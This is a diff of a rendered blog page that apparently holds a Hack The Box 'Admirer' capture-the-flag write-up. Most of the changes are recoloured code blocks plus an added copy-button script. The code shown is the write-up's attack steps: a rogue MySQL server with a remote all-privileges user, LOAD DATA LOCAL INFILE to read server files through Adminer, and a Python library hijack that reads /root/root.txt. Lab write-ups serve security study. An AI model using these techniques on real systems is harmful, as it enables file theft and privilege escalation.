-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">DATABASE</span> <span style="color:#48b685">&#39;htb_admirer&#39;</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">USER</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#f99b15">10</span>.<span style="color:#f99b15">10</span>.<span style="color:#f99b15">14</span>.<span style="color:#f99b15">2</span> <span style="color:#815ba4">IDENTIFIED</span> <span style="color:#815ba4">BY</span> <span style="color:#48b685">&#39;admirer&#39;</span>;   
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">ALL</span> <span style="color:#815ba4">PRIVILEGES</span> <span style="color:#815ba4">ON</span> htb_admirer.<span style="color:#5bc4bf">*</span> <span style="color:#815ba4">TO</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#f99b15">10</span>.<span style="color:#f99b15">10</span>.<span style="color:#f99b15">14</span>.<span style="color:#f99b15">2</span> <span style="color:#815ba4">WITH</span> <span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">OPTION</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">USER</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#48b685">&#39;%&#39;</span> <span style="color:#815ba4">IDENTIFIED</span> <span style="color:#815ba4">BY</span> <span style="color:#48b685">&#39;admirer&#39;</span>;   
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">ALL</span> <span style="color:#815ba4">PRIVILEGES</span> <span style="color:#815ba4">ON</span> htb_admirer.<span style="color:#5bc4bf">*</span> <span style="color:#815ba4">TO</span> admirer<span style="color:#5bc4bf">@</span><span style="color:#48b685">&#39;%&#39;</span> <span style="color:#815ba4">WITH</span> <span style="color:#815ba4">GRANT</span> <span style="color:#815ba4">OPTION</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#815ba4">FLUSH</span> <span style="color:#815ba4">PRIVILEGES</span>;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#815ba4">use</span> htb_admirer;
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#815ba4">CREATE</span> <span style="color:#815ba4">TABLE</span> <span style="color:#06b6ef">test</span>( 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>  <span style="color:#5bc4bf">&gt;</span> name  <span style="color:#fec418">VARCHAR</span>(<span style="color:#f99b15">255</span>),
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>  <span style="color:#5bc4bf">&gt;</span> color <span style="color:#fec418">CHAR</span>(<span style="color:#f99b15">7</span>),
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>  <span style="color:#5bc4bf">&gt;</span> <span style="color:#815ba4">PRIMARY</span> <span style="color:#815ba4">KEY</span> (name) 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>);
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#6ab825;font-weight:bold">CREATE</span> <span style="color:#6ab825;font-weight:bold">DATABASE</span> <span style="color:#ed9d13">&#39;htb_admirer&#39;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#6ab825;font-weight:bold">CREATE</span> <span style="color:#6ab825;font-weight:bold">USER</span> admirer@<span style="color:#3677a9">10</span>.<span style="color:#3677a9">10</span>.<span style="color:#3677a9">14</span>.<span style="color:#3677a9">2</span> <span style="color:#6ab825;font-weight:bold">IDENTIFIED</span> <span style="color:#6ab825;font-weight:bold">BY</span> <span style="color:#ed9d13">&#39;admirer&#39;</span>;   
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#6ab825;font-weight:bold">GRANT</span> <span style="color:#6ab825;font-weight:bold">ALL</span> <span style="color:#6ab825;font-weight:bold">PRIVILEGES</span> <span style="color:#6ab825;font-weight:bold">ON</span> htb_admirer.* <span style="color:#6ab825;font-weight:bold">TO</span> admirer@<span style="color:#3677a9">10</span>.<span style="color:#3677a9">10</span>.<span style="color:#3677a9">14</span>.<span style="color:#3677a9">2</span> <span style="color:#6ab825;font-weight:bold">WITH</span> <span style="color:#6ab825;font-weight:bold">GRANT</span> <span style="color:#6ab825;font-weight:bold">OPTION</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#6ab825;font-weight:bold">CREATE</span> <span style="color:#6ab825;font-weight:bold">USER</span> admirer@<span style="color:#ed9d13">&#39;%&#39;</span> <span style="color:#6ab825;font-weight:bold">IDENTIFIED</span> <span style="color:#6ab825;font-weight:bold">BY</span> <span style="color:#ed9d13">&#39;admirer&#39;</span>;   
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#6ab825;font-weight:bold">GRANT</span> <span style="color:#6ab825;font-weight:bold">ALL</span> <span style="color:#6ab825;font-weight:bold">PRIVILEGES</span> <span style="color:#6ab825;font-weight:bold">ON</span> htb_admirer.* <span style="color:#6ab825;font-weight:bold">TO</span> admirer@<span style="color:#ed9d13">&#39;%&#39;</span> <span style="color:#6ab825;font-weight:bold">WITH</span> <span style="color:#6ab825;font-weight:bold">GRANT</span> <span style="color:#6ab825;font-weight:bold">OPTION</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#6ab825;font-weight:bold">FLUSH</span> <span style="color:#6ab825;font-weight:bold">PRIVILEGES</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#6ab825;font-weight:bold">use</span> htb_admirer;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#6ab825;font-weight:bold">CREATE</span> <span style="color:#6ab825;font-weight:bold">TABLE</span> <span style="color:#447fcf">test</span>( 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>  &gt; name  <span style="color:#6ab825;font-weight:bold">VARCHAR</span>(<span style="color:#3677a9">255</span>),
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>  &gt; color <span style="color:#6ab825;font-weight:bold">CHAR</span>(<span style="color:#3677a9">7</span>),
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>  &gt; <span style="color:#6ab825;font-weight:bold">PRIMARY</span> <span style="color:#6ab825;font-weight:bold">KEY</span> (name) 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>);
 </code></pre></div><ul>
 <li>Change the bind address in your file /etc/mysql/mariadb.conf.d/50-server.cnf
 from default 127.0.0.1 to 0.0.0.0 for allowing remote connections to mysql
@@ -616,9 +616,9 @@ Since the adminer.php file in in the utility-scripts directory, we can use
 for user waldo, which we ound in the backup but with a typo:</p>
 </li>
 </ol>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#815ba4">LOAD</span> DATA LOCAL <span style="color:#815ba4">INFILE</span> <span style="color:#48b685">&#39;var/lib/mysql/mysql/local.xml&#39;</span> 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span style="color:#815ba4">INTO</span> <span style="color:#815ba4">TABLE</span> htb_admirer.test
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>FIELDS <span style="color:#815ba4">TERMINATED</span> <span style="color:#815ba4">BY</span> <span style="color:#48b685">&#34;\n&#34;</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#6ab825;font-weight:bold">LOAD</span> DATA LOCAL <span style="color:#6ab825;font-weight:bold">INFILE</span> <span style="color:#ed9d13">&#39;var/lib/mysql/mysql/local.xml&#39;</span> 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#6ab825;font-weight:bold">INTO</span> <span style="color:#6ab825;font-weight:bold">TABLE</span> htb_admirer.test
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span>FIELDS <span style="color:#6ab825;font-weight:bold">TERMINATED</span> <span style="color:#6ab825;font-weight:bold">BY</span> <span style="color:#ed9d13">&#34;\n&#34;</span>
 </code></pre></div><p><img src="/img/htb_admirer/12.png" alt=""></p>
 <ol start="4">
 <li>We read the data inserted to our table from the local file index.php.</li>
@@ -657,10 +657,10 @@ attack vector.</p>
 <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=3&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiuwdyNgJ_pAhX9xjgGHd_2A0kQFjACegQIBBAB&amp;url=https%3A%2F%2Fmedium.com%2F%40klockw3rk%2Fprivilege-escalation-hijacking-python-library-2a0e92a45ca7&amp;usg=AOvVaw3-QulW0rZZnpDyQbOp2xNV">here</a></p>
 <p>We create a directory <code>/tmp/fm</code> and write a python script in the name of the module <code>shutil.py</code> containing the function <code>make_archive(a,b,c)</code>
 which will run out desired code, in this case cat ing out the root.txt to a file named hello in the directory /tmp/fm:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">os</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">make_archive</span>(a,b,c):
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>        os<span style="color:#5bc4bf">.</span>system(<span style="color:#48b685">&#34;cat /root/root.txt &gt; /tmp/fm/hello&#34;</span>)
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">os</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">make_archive</span>(a,b,c):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span>        os.system(<span style="color:#ed9d13">&#34;cat /root/root.txt &gt; /tmp/fm/hello&#34;</span>)
 </code></pre></div><p>Now we have to make python look for the module in our directory first instead
 of <code>/usr/lib/python3.5</code>.</p>
 <p>We trying exporting the path using <code>export PYTHONPATH=/tmp/fm</code>. But this
@@ -811,6 +811,64 @@ directly in the sudo command like <code>sudo VARIABLE=VALUE COMMAND</code>.</p>
         
         hasInnerContainers: true,
     });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
 </script>
 
 
